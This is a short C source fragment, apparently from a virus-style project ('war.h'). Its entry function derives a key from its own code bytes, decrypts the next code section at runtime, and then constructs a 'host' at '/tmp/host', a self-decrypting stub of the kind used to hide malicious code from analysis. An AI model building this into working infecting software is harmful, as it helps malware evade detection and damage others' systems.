#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void __entry(void)
{
	struct s_keychain keychain = {0};
	struct s_host host;
	const char filename[] = "/tmp/host";

	update_keychain_left(&keychain, (char *)__entry, (void *)host_constructor - (void *)__entry);
	decrypt_left(&keychain, (char *)&host_constructor, (void *)&criteria - (void *)&host_constructor);

	host_constructor(&host, &keychain, filename);
}
